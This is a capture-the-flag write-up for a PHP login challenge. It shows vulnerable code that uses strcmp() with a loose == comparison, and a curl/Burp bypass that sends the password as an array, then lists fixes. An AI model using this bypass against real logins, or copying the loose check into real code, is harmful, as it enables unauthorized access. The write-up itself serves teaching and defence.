# C Style Login

**Competition:** OliCyber<br>
**Category:** Web<br>
**URL:** http://clogin.challs.olicyber.it

---

## Description

> Can you guess my password?

A login form that uses `strcmp()` to compare passwords. The vulnerability is in the behavior of `strcmp()` with PHP's type juggling.

---

## Solution

### Step 1 — Source Code Analysis

When visiting the site, we immediately notice the presence of a link to the source code (`/?source`). Examining it, we find the vulnerable PHP code:

```php
<?php
include_once('./secrets.php');
if (isset($_POST['password'])) {
  if (strcmp($_POST['password'], $password) == 0) {
    echo $FLAG;
  } else {
    echo '<br />Wrong Password<br /><br />';
  }
}
?>
```

The access condition is:

```php
if (strcmp($_POST['password'], $password) == 0)
```

The flag is printed when `strcmp()` returns `0`, meaning the two arguments are **equal**.

---

### Step 2 — Vulnerability Identification

The vulnerability lies in how `strcmp()` behaves in PHP when receiving non-string arguments:

- **PHP < 8:** `strcmp(array, string)` returns `NULL` instead of an integer.
- `NULL == 0` is **`true`** in PHP because of loose comparison (type juggling).

As a result, the check becomes:

```
strcmp([], $password) → NULL
NULL == 0             → true
```

The flag is returned **without knowing the actual password**.

---

### Step 3 — Exploitation

The HTML form always sends `password` as a string. To send an **array** to the server, you must manipulate the HTTP request directly.

**Method 1 — curl:**

```bash
curl -X POST http://clogin.challs.olicyber.it \
     -d "password[]="
```

**Method 2 — Burp Suite:**

1. Capture a POST request from the form
2. Modify the body from `password=anything` to `password[]=`
3. Send the modified request

The `[]` suffix causes PHP to interpret `password` as an array instead of a string.

---

### Step 4 — Output

The response will contain the flag:

```
flag{...}
```

Note: PHP will also emit a warning:

```
Warning: strcmp() expects parameter 1 to be string, array given
```

This confirms exactly the behavior being exploited: `strcmp()` received an array, returned `NULL` and the loose comparison granted access.

---

## Vulnerability Exploited

| Aspect | Detail |
|---|---|
| **Type** | strcmp() Type Juggling |
| **Root Cause** | strcmp() with array returns NULL, not an exception |
| **Comparison** | Use of `==` (loose) instead of `===` (strict) |
| **Impact** | Password bypass without knowing it |

---

The loose comparison `==` (instead of `===`) is the root of the problem. If the code used `=== 0`, the exploit wouldn't work, since `NULL !== 0`.

---

## Conclusions

- Use strict comparison `=== 0` instead of `== 0`
- Validate input type with `is_string($_POST['password'])` before passing to `strcmp()`
- Upgrade to **PHP 8+**, where `strcmp()` with non-string arguments generates a fatal error
- PHP's type juggling can introduce non-obvious vulnerabilities
- Dynamic type flexibility requires explicit validation